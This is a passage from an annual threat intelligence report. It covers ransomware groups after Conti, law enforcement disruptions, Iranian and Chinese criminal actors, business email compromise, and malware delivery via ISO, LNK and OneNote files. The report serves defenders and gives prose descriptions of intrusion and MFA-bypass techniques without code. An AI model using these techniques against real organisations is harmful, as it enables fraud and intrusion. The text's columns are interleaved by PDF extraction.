abuse of a zero\-day vulnerability in the vendor's platform, there are 

some steps organizations can take to detect and mitigate the threat 

posed by GOLD TAHOE.

• Enforce a retention policy on shared files to ensure data 

is available for only as long as it is needed. 

• Protect highly sensitive data (like PII) with file level 

encryption that requires a key that is not stored on the 

file sharing service. If a platform does not support such 

a facility, it may not be the best method of sharing this 

type of data. 

• Encrypt data in transit and at rest.

Threat Actor Use of 

Artificial Intelligence

• Enable alerting that indicates when files are being 

accessed and monitor for anomalies.

07

Conclusion

• 

Implement auditing so that if a breach occurs it can 

be quickly determined what files were present during 

relevant time period(s).

08

Appendix

• For on\-premises solutions, implement network flow 

monitoring to detect and alert on large data transfers.

2023 State of the Threat: A Year in Review

22

The Conti Implosion—The Hydra 
is Dead but Its Limbs Survive

Darkside's rebranding as BlackMatter, the group instead apparently 

turned to other existing operations. As a result, Conti members and 

affiliates began to work with other ransomware groups. 

The most obvious impact of the conflict in Ukraine on the 

cybercrime ecosystem was the implosion in the first half of 2022 of 

GOLD ULRICK, the group behind Conti ransomware. The revelations 

in the Conti Leaks—a large disclosure of information about the 

group's activity, likely by a Ukrainian affiliate angered at the group's 

almost immediate declaration of support for Russia's invasion—

preceded the disappearance of Conti ransomware by a few months. 

While the full reasons for its dissolution remain unclear, it is likely 

that affiliates were concerned about damage to the Conti name that 

might make it harder for victims to pay. GOLD ULRICK may also have 

been disconcerted by the U.S. Department of State announcing9 

in May 2022 a $10 million reward for information leading to the 

identification or location of key leaders behind the Conti ransomware 

operation. Such unwanted scrutiny may have also been a cause for 

the group's disappearance.

However, that did not mean that group members remained absent 

from the ransomware ecosystem for long. Unlike previous disruptions 

to ransomware activities that have resulted in rebrands, such as 

One affiliate was observed going on to work with LockBit, Suncrypt 

and Monti ransomware operations after Conti's demise. The apparent 

leader of the Conti ransomware operation—revealed as “Stern” in 

the Conti chat logs—was subsequently observed10 transacting with 

Quantum, Karakurt, Diavol, and Royal ransomware schemes. Other 

schemes, such as BlackBasta and Nokoyawa, have also been linked11 

to former Conti operators. 

These observations demonstrate adaptability within a broad network 

of criminals, whose relationships allow for cooperation to meet 

common ends. The ransomware ecosystem is not made up of 

monolithic units that operate within their own closed spheres. The 

ransomware\-as\-a\-service model allows individuals to work with any 

scheme, and it is likely that, through this process, strong working 

relationships have been built that can be relied on when operations 

are disrupted.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

23

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Ransomware—Why Some Groups 
Stay the Course and Others Fall at 
the First Hurdle

following their widescale exploitation of the MOVEit Transfer zero\-

day vulnerability to steal data from multiple victims, Clop operator 

GOLD TAHOE announced15 they had deleted data related to any 

“government, city or police service.” Despite this, they have listed 

public sector victims on their leak site from several countries. 

Tor is littered with ransomware group leak sites that never list more 

than a few victims. Groups with three or fewer victim listings in the 

Operating a private ransomware group or exercising tight control 

past year include Vendetta, Dunghill Leak, and CrossLock. What 

makes some groups successful, and others a flash in the pan?

over affiliates makes avoiding certain victims in this way much easier 

to achieve than it can be in less rigidly managed organizations.

To survive and flourish in a competitive market and to avoid 

For example, GOLD MYSTIC's loosely managed affiliate model—

disruption, ransomware operators and their affiliates need to walk 

delegating the responsibility of victim selection, ransom negotiation 

a fine line between impact and scrutiny. They need victims to pay; 

and payment distribution to the affiliate—brings considerable 

Forced to Evolve

their ability to take business operations offline and steal data that the 

advantages in terms of scale, something that the number of LockBit 

05

06

State\-Sponsored 

Threat Activity

victim does not want to be made public are crucial elements of that. 

attacks every month demonstrates. However, it also means that 

They also want victims to know that they are serious and that paying 

some affiliates may behave in ways that bring unwanted attention. 

them will likely result in a successful outcome. This builds reputation. 

In December 2022, after a LockBit affiliate targeted a children's 

But the more effective they become, the more scrutiny they face 

hospital in Toronto, Canada, an apology was posted16 to the leak site 

from government agencies and law enforcement operations. 

and a free decryptor was allegedly provided to enable the hospital to 

recover files and access. GOLD MYSTIC also claimed to have banned 

Threat Actor Use of 

Artificial Intelligence

Although issues of jurisdiction remain a challenge, law enforcement 

the affiliate from working again with the group. In a further example, 

has clearly demonstrated an ability in recent years to disrupt if not 

LockBitSupp, the self\-proclaimed leader of GOLD MYSTIC, appeared 

prosecute ransomware operators and their affiliates. They recovered 

unaware that Royal Mail had been attacked by LockBit until the 

stolen funds12 in 2021 following the Darkside Colonial Pipeline attack, 

organization's name appeared on the LockBit leak site.

07

Conclusion

08

Appendix

issued sanctions13 in February 2023 against individuals engaged in 

TrickBot and Conti ransomware operations, and infiltrated14 the Hive 

ransomware operation and took its infrastructure offline. 

As a result, many groups publicly ban the targeting of critical national 

infrastructure, government organizations and the healthcare and 

education verticals in the hope of avoiding scrutiny. For example, 

2023 State of the Threat: A Year in Review

24

01

Letter From Our VP

However, some groups are simply less scrupulous—Vice Society, 

ESXi servers worldwide were compromised in this campaign. This 

operated by GOLD VICTOR, specialized in targeting education and 

is despite a patch being available since February 23, 2021\. ESXiArgs 

healthcare organizations until it became dormant in late June 2023, 

ransomware has been observed only partially encrypting files larger 

and then possibly returned17 as Rhysida ransomware, which also 

than 128MB. Smaller files are fully encrypted.

02

03

Executive Summary 

and Key Findings

targets healthcare and education. 

Reasons for this spate of new variants appear based on the 

The Business of Cybercrime—

Is Boomtime Back?

Ransomware groups also need to be adaptable to survive and 

perception that ESXi environments are in general less well protected 

prosper. There has been an increase in the number of ransomware 

and instrumented than Windows environments. The impact of 

groups with Linux variants that are designed to encrypt VMware ESXi 

encrypting a single ESXi host can also be significant, depending on 

hosts. Third\-party reports suggest that ransomware operations with 

how an organization's virtualized environment is set up.

such variants now include Royal, Black Basta, LockBit, BlackMatter, 

AvosLocker, REvil, HelloKitty, RansomEXX, and MichaelKors, as well 

In the past year, Secureworks incident responders have worked 

as multiple lower profile variants18 based on the Babuk ESXi source 

on multiple ransomware attacks affecting VMware ESXi servers 

code leaked in September 2021\. One example is the ESXiArgs 

conducted by ransomware groups including LockBit, ESXiArgs, and 

ransomware19 operation, which in early 2023 used scan\-and\-exploit 

ALPHV(BlackCat). However, despite attempts by LockBit to launch a 

to conduct a wave of ransomware attacks targeting an OpenSLP 

macOS encryptor, post\-intrusion ransomware aimed at the macOS 

heap\-overflow vulnerability (CVE\-2021\-21974\) in VMware ESXi 

environment remains rare.

hypervisors. Both the French and Italian cyber security agencies 

issued advisories, with reports that approximately 3,200 VMware 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

25

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Fighting Back, but With How 
Much Impact? 

The emphasis placed in 2021 by the Biden\-Harris administration 

on combatting cybercrime and other threat actor activity 

has continued throughout the reporting period. Both U.S. law 

enforcement and other government agencies, and international 

partners, have maintained a relatively high tempo of activity, with 

website seizures, sanctions, arrest warrants, and more. 

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

How much of a long\-term impact all this activity will ultimately 

have remains to be seen. On the one hand, some ransomware 

groups appear to have continued to avoid attacking critical 

infrastructure organizations, as discussed above. This could be 

deliberate to avoid drawing law enforcement attention, but the 

U.S.'s focus20 on improving cybersecurity in critical infrastructure 

sectors may be paying rewards. 

On the other hand, threat actors quickly regroup and adapt, 

particularly when operating in jurisdictions beyond the reach of the 

investigating bodies. Where there is no real risk of arrest, and asset 

seizure is difficult, the incentive to get out of the crime business 

altogether just is not there. Furthermore, economic sanctions, 

which appear to have particularly impacted the technology 

sector21, might even in some cases have the effect of driving some 

individuals out of employment and into cybercrime.

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

JANUARY 16, 2023

Hive ransomware 
infrastructure taken 
down by FBI 

MARCH 24, 2023

Breachforums admin 
arrested by FBI 

JUNE 16, 2023 

Mikhail Matveev, 31, 
aka "Wazawaka" Babuk 
operator indicted and 
sanctioned 

FEBRUARY 9, 2023

U.S. and UK sanctions 
announced against 
TrickBot operators 

APRIL 4, 2023

Genesis Market 
disruption and arrests 

Figure 10\. Law enforcement action timeline 2023\. (Source: Secureworks)

2023 State of the Threat: A Year in Review

26

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Genesis Market's Temporary 
Exodus

The takedown at the beginning of April 2023 of Genesis Market's 

clearnet website appeared to have an impact on user confidence, 

at least at first. However, despite the takedown attempt, Genesis 

Market remained functional on the Tor network, albeit with the speed 

limitations of hosting it on that network. It was clear that the 119 

arrests associated with the takedown, conducted under the name of 

Operation Cookie Monster, targeted users of the Genesis Market, not 

the owners or admins.

While the restocking of logs initially paused for several weeks in 

late April, findings by CTU researchers indicated that the operators 

behind the market remained active, with 1,874 new logs added to 

the site in May. On April 4, the day of the clear web takedown, there 

were 468,275 logs stored on the clear website. On April 5, there were 

468,480 stored on the Tor site (the data was almost the same as 

both domains pointed at the same servers). On June 6, the number 

of logs on the Tor site had increased to 471,284\. However, given the 

impact that the arrests had on user confidence, that small increase 

does not necessarily mean that sales figures increased or even 

remained the same.

s
g
o

l

f
o
r
e
b
m
u
N

Figure 11\. Logs on Genesis Market, before and after the Clearnet website takedown. (Source: Secureworks) 

2023 State of the Threat: A Year in Review

27

400,000410,000420,000430,000440,000450,000460,000470,000480,000490,000500,000468,275468,480471,28404/04/2023clearnet05/04/2023Tor06/06/2023Tor 
 
01

Letter From Our VP

This illustrates how law enforcement can disrupt clearnet activity 

but may find it harder to take down services hosted on the dark 

What Made Genesis Market 
So Popular?

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

web. Nonetheless, the takedown had clearly sown distrust among 

Unlike other marketplaces that typically sell static stolen 

users. Chatter on underground forums indicated that some users 

data, the Genesis Market operates a unique, highly functional, 

thought the re\-emerged site was a honeypot for law enforcement. 

and easy to use “bot” system. This is a dynamic system that 

Some threat actors were clearly concerned and looking for 

alternatives. Others may have been deterred by performance 

problems caused by the custom Genesium Browser and extension 

needing to communicate with command and control (C2\) 

infrastructure over Tor. The takedown may also have spooked the 

site owners as, shortly afterwards, in June, they took the Tor site 

down and sold it to an undisclosed buyer.

continually updates victim information. This includes capturing 

changes to passwords and any new sites the victim accesses.

In Genesis Market terminology, the term “bot” is used to refer 

to malware that constantly updates the market and stolen 

data, which can include anything from login details to cookies 

and digital fingerprints.

When a buyer purchases a bot, they are provided with two 

options to exploit the stolen data. They can either use a plugin 

designed for their existing web browser or use a dedicated 

Chromium\-based browser. Both options allow the buyer to 

impersonate the victim with their stolen data, with the system 

handling most of the complexity. This makes it very easy for 

criminals to use the illicit access that has been obtained. Both 

options come with anti\-detection features to help the buyer 

evade security systems.

In contrast, markets like the Russian Market typically sell 

traditional stealer logs. These logs are raw dumps of stolen 

information, including passwords, cookies, credit card 

numbers, and personal identification details, among other 

sensitive data. However, they do not offer any specialized 

software for making these logs instantly usable. Buyers will 

have to manually configure their systems to utilize the stolen 

data or use clear\-text usernames and passwords directly. 

This makes the process more labor\-intensive and technically 

demanding for buyers than Genesis Market's approach.

2023 State of the Threat: A Year in Review

28

01

Letter From Our VP

BreachForums Breached

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

After operating for a year, BreachForums, the natural successor 

to RaidForums, which was itself taken down in February 2022, 

was targeted in March 2023 in a concerted law enforcement 

operation led by the FBI. This resulted in the arrest of the owner 

and administrator of the site, Conor Brian Fitzpatrick22, who used 

the alias “Pompompurin.” Fitzpatrick pled guilty23 to hacking and 

child pornography possession charges. A second administrator 

“Baphomet” subsequently announced that the site would be 

permanently closed after expressing concern that some of the 

Innovations in TTPs Occur 

backend servers might have been placed under law enforcement 

04

When Infection Chains Are 

control. On June 19, the administrator from a rival forum claimed 

Forced to Evolve

that they had compromised a new BreachForums site, set up by 

the ShinyHunters threat group with Baphomet. Following this 

attack, the new BreachForums database was reportedly leaked 

across several platforms, including Telegram.

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Hive Ransomware Infrastructure 
Hived Off

It was not just underground forums and marketplaces that were 

disrupted by law enforcement activity this year. In January 2023, 

an international operation24, led by the FBI in coordination with 

Dutch and German law enforcement agencies, targeted the 

infrastructure associated with the Hive ransomware\-as\-a\-service 

(RaaS), operated by GOLD HAWTHORNE. Websites and servers 

that members of the group used to communicate with each other 

were seized, resulting in a disruption that led to the apparent 

demise of Hive. Since July 2022, the FBI had allegedly gained 

access to the group's network, seized decryption keys, and issued 

them to victims of the ransomware\-as\-a\-service (RaaS) scheme. 

This activity clearly denied the individuals behind the scheme 

criminal profits while easing the pain of its many victims.

2023 State of the Threat: A Year in Review

29

01

Letter From Our VP

TrickBot Members Sanctioned

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

In the case of TrickBot, people rather than infrastructure were 

targeted. In February 2023, seven individuals associated with the 

activities surrounding the development and deployment of TrickBot 

malware were jointly sanctioned by the UK Foreign, Commonwealth 

and Development Office (FCDO) and the U.S. Department of the 

Treasury's Office of Foreign Assets Control (OFAC). The group, 

which we track as GOLD BLACKBURN, was heavily embedded with 

the operators of the now defunct Conti ransomware scheme, an 

especially prolific and sophisticated criminal enterprise operated by 

Innovations in TTPs Occur 

GOLD ULRICK. The aim of these sanctions is to prohibit individuals 

04

When Infection Chains Are 

or organizations in the UK and U.S. from having dealings with the 

Forced to Evolve

listed entities, including making or facilitating payments to them. 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Laundering the seven individuals' proceeds of crime might be harder 

as a result, impacting their ability to realize their profits. It follows 

OFAC placing its first sanction on a virtual currency mixer in May 

2022, due, on that occasion, to the mixer's involvement in facilitating 

money laundering for the North Korean regime. 

Law enforcement agencies have long come up against issues of 

jurisdiction, which not only impede the ability to identify specific 

individuals involved in a cybercriminal operation, but also shield them 

from arrest. These latest attempts at disruption versus prosecution 

are a possible attempt to address that. If you can't prosecute threat 

actors, you can at least frustrate their activities and hamper their 

ability to make and spend money, travel internationally, or leave 

Russia at all.

Romcom RAT Blurs the Lines

The war in Ukraine has not permanently damaged the 
cybercriminal landscape as originally hoped but third\-party 
researchers and the media have asked questions25 about 
whether it has blurred the lines between cybercrime and 
nation\-state activity. GOLD FLAMINGO, operators of the 
Cuba ransomware, has been accused of performing espionage 
activities alongside moneymaking.

The group was reported26 in August 2022 to have deployed 
the RomCom RAT alongside Cuba ransomware in an intrusion. 
CERT\-UA subsequently saw RomCom RAT used against 
government and military targets in Ukraine27\. 

Figure 12\. GOLD FLAMINGO's Cuba ransomware leak site, which at the 
time of publication had posted its most recent victim on July 11, 2023\. 
(Source: Secureworks)

The number of named Cuba ransomware victims dropped off 
throughout the year following the invasion of Ukraine. After a 
brief surge in late 2022, no victims were named at all for the 
first four months of 2023\. It is possible that the group has 
instead been actively engaged in undertaking operations on 
behalf of the Russian State, but it is also feasible they do not 
have exclusive use of the RomCom RAT, and another group 
has conducted those operations. It does not appear that Cuba 
ransomware itself has been deployed against these Ukrainian 
targets, and there is still no smoking gun evidence about 
routine collusion between ransomware groups and Russian 
intelligence operations.

2023 State of the Threat: A Year in Review

30

 
01

Letter From Our VP

Chinese Cybercrime Activity 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

A very high proportion of the ransomware activity that CTU 

researchers observe emanates from cybercriminals based in either 

Russia or its CIS neighbors. However, there are exceptions. Over 

the past year, we have observed cybercriminal attacks conducted 

by financially motivated threat groups that are likely Chinese. One 

group is particularly noteworthy: GOLD FIESTA.

CTU analysis of GOLD FIESTA intrusion activity, which was 

observed during several incident response engagements that took 

place in February 2023, identified clear overlap with Hello, Cring, 

and Rapture ransomware precursor activity. For example, we saw 

Forced to Evolve

the use of a rare set\-alias command for the PowerShell Invoke\-

Expression cmdlet that is associated with Chinese\-language 

research on antivirus evasion that was also observed in Rapture 

Another possible example of a financially motivated Chinese group 

is GOLD BARONDALE. The group leveraged a DNS logging platform 

in a November 2022 attack we observed that has previously been 

associated with Chinese state\-sponsored groups. This attack was 

frustrated before the attackers achieved their goals on the network, 

so we cannot say for sure whether it was financially motivated, but 

the targeting was not typical of cyberespionage activity. 

Both groups commonly use open\-source tools and techniques 

primarily associated with Chinese\-language security research, in 

common with many Chinese state\-sponsored espionage groups 

such as BRONZE UNIVERSITY and BRONZE ATLAS. It would be 

unsurprising for groups to prefer tools and techniques covered in 

open\-source research written in their native language. It is even 

possible that there is some overlap in personnel between groups, 

as with the charges29 levied in the U.S. in 2020 against BRONZE 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

activity in 2023, and Hello and Cring activity in 2021\. It appears 

ATLAS members.

probable that GOLD FIESTA developed and deployed these and 

likely other ransomware families. 

GOLD FIESTA likely used scan\-and\-exploit against SharePoint 

server vulnerabilities to gain access in the February 2023 intrusions, 

as it has done in previous attacks. Third\-party observations28 of 

Hello precursor activity identified the IAV as the exploitation of the 

SharePoint vulnerability CVE\-2019\-0604\.

2023 State of the Threat: A Year in Review

31

in May 2022, having responded to multiple incidents involving 

COBALT MIRAGE activity. Despite this and other public reports on 

this group, attacks continued, likely driven both by their freedom to 

operate this criminal enterprise and the intent to make money for 

themselves. While sufficiently competent to quickly fold publicly 

disclosed vulnerabilities and proof of concept code into their 

operations, they were not adept at covering their tracks. 

On September 14, 2022, Secureworks published30 a detailed report 

providing credible technical evidence (see figure 13\) linking the 

COBALT MIRAGE activity to several individuals: Ahmad Khatibi, 

CEO of Afkar System Co. and Mansour Ahmadi, CEO of Najee 

Technology, as well as a third entity known as Secnerd, also linked 

to Mansour Ahmadi. 

01

Letter From Our VP

Iranian Ransomware for Revenue 

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Ransomware is routinely used by Iranian state\-sponsored threat 

groups as a disruptive tool in targeted attacks, often against 

regional adversaries, particularly Israel. However, one Iranian group 

has stood out in their use of ransomware style attacks resulting 

from a financial, rather than political, motive. 

COBALT MIRAGE has been operating since at least June 2020, 

conducting opportunistic intrusions using scan\-and\-exploit 

tactics and following up with ransomware attacks using Microsoft 

Bitlocker and the open source DiskCryptor encryption solution. 

CTU researchers initially publicly reported on this group's activity 

File Name
Directory
File Size
File Modification Date/Time
File Access Date/Time
File Inode Change Date/Time
File Permissions
File Type
File Type Extension
MIME Type
PDF Version
Linearized
Page Count
Language
XMP Toolkit
Producer
Creator
Creator Tool
Create Date
Modify Date
Document ID
Instance ID
Author

:
:
:
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
: 
:

Hi.pdf
.
39 kB
2021:12:17 08:55:00\+00:00

rwxr\-xr\-x
PDF
pdf
application/pdf
1\.7
No
1
en\-US
3\.1\-701
Microsoft Word 2019
ahmad khatibi
Microsoft® Word 2019
2021:12:17 23:54:22\+03:30
2021:12:17 23:54:22\+03:30
uuid:
uuid:
ahmad khatibi

Figure 13\. Document metadata revealed the identity of an individual linked to COBALT MIRAGE ransomware activity (Source: Secureworks)

2023 State of the Threat: A Year in Review

32

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Later that day the U.S. Department of Justice issued31 an 

Since the September publications, COBALT MIRAGE ransomware 

indictment for both Ahmad Khatibi and Mansour Ahmadi, and a 

activity appears to have ceased. However, it is likely that the 

third individual, Amir Hossein, in relation to attacks on hundreds of 

individuals involved continue to work on other projects.

victims in the U.S. including a children's hospital. 

The U.S. Department of the Treasury sanctioned32 the same three 

individuals and seven others, and a joint cybersecurity advisory was 

published based on work from multiple Five Eyes agencies. The 

publication referred to these individuals as Islamic Revolutionary 

Guard Corp (IRGC) affiliated actors. It is unclear to what degree 

the ransomware activity was IRGC\-directed or whether it was a 

side\-activity alongside work that was performed for the IRGC. A 

potential operational model is illustrated below.

Islamic Revolutionary Guard Corps Intelligence
Organization (IRGC\-IO)

Tasks

Najee Technology \& Secnerd

Support COBALT 
MIRAGE Operations

Afkar System

Figure 14\. Potential relationships between Najee, Secnerd, Afkar System, and the IRGC\-IO. (Source: Secureworks)

2023 State of the Threat: A Year in Review

33

Business Email Compromise— 
a Persistent Problem

Business email compromise (BEC) is one of the most financially 

damaging online crimes overall for organizations. It exceeds even 

ransomware in aggregate, mainly because it is so prolific, even if 

individual financial losses from BEC may be lower than individual 

losses from ransomware. The FBI estimates33 that in 2022 alone, it 

received complaints about 21,832 BEC attacks, resulting in adjusted 

losses in the U.S. of over $2\.7 billion USD, an increase from $2\.4 

billion USD in 2021\. In contrast, the FBI received 2,385 complaints 

about ransomware attacks in the U.S. in 2022 that resulted in 

estimates for adjusted losses of approximately $34\.3 million. 

However, individuals and organizations may be more motivated 

to report BEC than ransomware attacks to the FBI which could 

somewhat skew these figures.

Most BEC incidents involve a threat actor intercepting an email chain 

and impersonating one of the participants to convince the victim to 

modify details of a legitimate payment to redirect it to an attacker\-

controlled bank account rather than the intended recipient. 

Threat actors use a range of techniques including mass phishing 

campaigns to steal credentials which are then used to access the 

victim email account. Once they have access, they often monitor 

the activity of the email account, identifying email chains with 

vendors and suppliers in which they can insert themselves. After the 

attacker has successfully initiated communication with the victim, 

they provide modified legitimate financial documents or payment 

instructions for the victim to send money to the attacker\-controlled 

accounts. Attackers may also spoof victim organizations to request 

payment without first compromising a victim's email account. This 

variation is referred to as Business Email Spoofing or CEO fraud.

Over the course of the year, CTU researchers have observed threat 

actors employing a range of different methods to capture credentials 

and facilitate BEC fraud. These have included the use of offline 

HTML login pages to circumvent detections that look for malicious 

executables or documents that auto\-forward users to fake login 

pages. Threat actors have also been observed employing a variety 

of tactics to bypass multi\-factor authentication (MFA) including 

social engineering to convince a victim to approve an authentication 

request and, less frequently, MFA fatigue attacks which send many 

authorization requests in quick succession. Once a victim approves a 

malicious MFA request, the threat actor can add their own device to 

a list of approved devices to maintain persistence.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

34

In one compromise analyzed by Secureworks incident responders, 

Organizations can mitigate BEC attacks by comprehensively 

a threat actor gained access because an employee approved 

implementing MFA across all user accounts, including those for 

a malicious MFA request and did not report the incident. Once 

senior executives. But remember that not all MFA solutions are 

authenticated, the threat actor added their device to a list of 

created equal; using an authenticator app is better than SMS, 

approved MFA devices. The threat actor leveraged this access to 

and number matching is an improvement on click\-to\-accept, and 

monitor the victim's emails for an extended period without detection. 

represents a meaningful mitigation to MFA fatigue. It is advisable 

They then launched a successful attack to reroute a scheduled 

to closely follow Microsoft's Outlook authentication guidance to 

payment. In other incidents, threat actors were able to circumvent 

continually adopt best practices. Training employees not to accept 

MFA completely. In one such case, thanks to non\-configured 

MFA requests they did not generate is also a useful exercise. Robust 

Conditional Access policies, the threat actor was able to gain 

business processes such as two\-person payment processing, 

access without involving MFA. In another, the presence of legacy 

telephone\-only approvals, and telephone\-only vendor checks are 

authentication methods on the system allowed the threat actor to 

essential.

bypass MFA and still gain access.

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

35

04Innovations in TTPs Occur 
When Infection Chains 
Are Forced to Evolve

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

2023 State of the Threat: A Year in Review

36

01

Letter From Our VP

When Microsoft Disabled Macros

containers is the Windows Shortcut, or LNK files, which can execute 

additional files within the container using command line parameters, 

Macro\-enabled Office documents have been a mainstay of malware 

as necessary.

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

distribution campaigns for many years. That started to slow down 

when Microsoft announced34 substantive action against this threat 

in early 2022\. Microsoft revealed they would begin blocking macros 

from executing by default in documents downloaded from the 

Internet, as indicated by the mark\-of\-the\-web (MotW) metadata 

added by Windows to downloaded files. After a false start in early 

June 2022, the change was made permanent in Office products in 

late July, reducing the impact of this malware delivery mechanism in 

Innovations in TTPs Occur 

04

When Infection Chains Are 

one fell swoop.

Forced to Evolve

The change forced threat actors to adopt alternative infection chains 

For example, the DarkTortilla crypter35 is typically delivered by emails 

with a logistics lure and includes the malicious payload in an archive 

attachment with file types such as .iso, .zip, .img, .dmg, and .tar. 

In one campaign that CTU researchers investigated, the redacted 

filename of the attached ISO image archive file (.iso) included the 

name of the organization from which the email was purportedly sent.

to keep phishing success rates up. CTU researchers have observed 

an increase in the number of spam campaigns relying on container 

payloads—such as ISO, IMG, and VHDX—to deliver malware. These 

file types are opened natively by modern Windows versions and are 

presented to users as a folder opened within the familiar Explorer 

interface, where they can navigate to the malicious files found 

within. The most common type of malicious file located in these 

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

ISO

LNK

ZIP

DLL

Figure 15\. Common file extensions used in attacks. (Source: Secureworks)

2023 State of the Threat: A Year in Review

37

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

08

Appendix

Figure 16\. DarkTortilla malspam containing malicious archive attachment. 
(The German text translates to “Good morning, Please give us your best 
price offer for our attached order. Awaiting your kind reply. Kind regards.”) 
(Source: Secureworks)

Many techniques have remained the same, including the use of 

ZIP archives to encapsulate delivered files. Less common formats 

such as RAR and ACE are seen on occasion but suffer from 

Windows' inability to open these files without third\-party utilities 

installed. Similarly, active content such as executable, script files, 

and shortcut links remain popular. JavaScript, VBS, and Windows 

batch files are the most commonly observed script types observed 

in attacks. In one phishing campaign to deliver the Remcos RAT 

that CTU researchers observed in May 2023, emails included ZIP 

archive attachments that contained PDF files. Clicking on the PDF 

took victims first to a gateway page that performed checks on the 

victim's system and then to a prompt to download an obfuscated 

VBS file from the MEGA cloud file\-sharing site.

Threat actors have also increasingly turned to the use of malicious 

Microsoft OneNote files to deliver payloads such as the RedLine 

information stealer, Qakbot, or IcedID. CTU researchers observed 

two infection chains used by unknown threat actors from January 

12 to January 18, 2023, to deliver RedLine. In both cases, the 

victim received a OneNote file attachment. Opening it revealed 

a blurred image which recipients were invited to click. This image 

was underlaid with multiple copies of a malicious script. Executing 

the script generated a pop\-up warning. If the victim dismissed the 

warning, the script launched a BAT file, copied a PowerShell binary to 

a new location, and executed a PowerShell command that decrypted, 

decompressed, and executed the RedLine payload. 

Threat actors evolved their use of OneNote files over the following 

months to avoid detection. In a campaign that delivered Qakbot, the 

OneNote attachment contained an embedded HTML Application 

(HTA) file (Open.hta) that downloaded and executed the Qakbot 

payload. In further campaigns to deliver IcedID, a threat actor used 

a similar approach to the Qakbot campaign, leveraging modified 

HTA code to launch obfuscated VBScript code that launched a 

PowerShell command to download and execute the payload. CTU 

researchers have investigated several intrusions that ultimately led to 

Black Basta ransomware deployment where OneNote files were used 

to deliver Qakbot.

2023 State of the Threat: A Year in Review

38

01

Letter From Our VP

02

03

Executive Summary 

and Key Findings

The Business of Cybercrime—

Is Boomtime Back?

Innovations in TTPs Occur 

04

When Infection Chains Are 

Forced to Evolve

05

06

State\-Sponsored 

Threat Activity

Threat Actor Use of 

Artificial Intelligence

07

Conclusion

Botnets—Some Flourish, 
Others Decline

The past year saw the continued decline of the large\-scale, long\-

lived botnets favored by cybercriminals for the past decade and a 

half. The Conti leaks fallout of March 2022 expedited the downfall of 

both the TrickBot and Bazar botnets, previously operated by GOLD 

BLACKBURN. The last year also saw GOLD CRESTWOOD's prolific 

Emotet botnet, whose association with the Conti ransomware 

operation was revealed in the Conti leaks, largely sidelined by its 

operators for unknown reasons, despite several signals that they 

intended to return it to its former prevalence. For example, in 

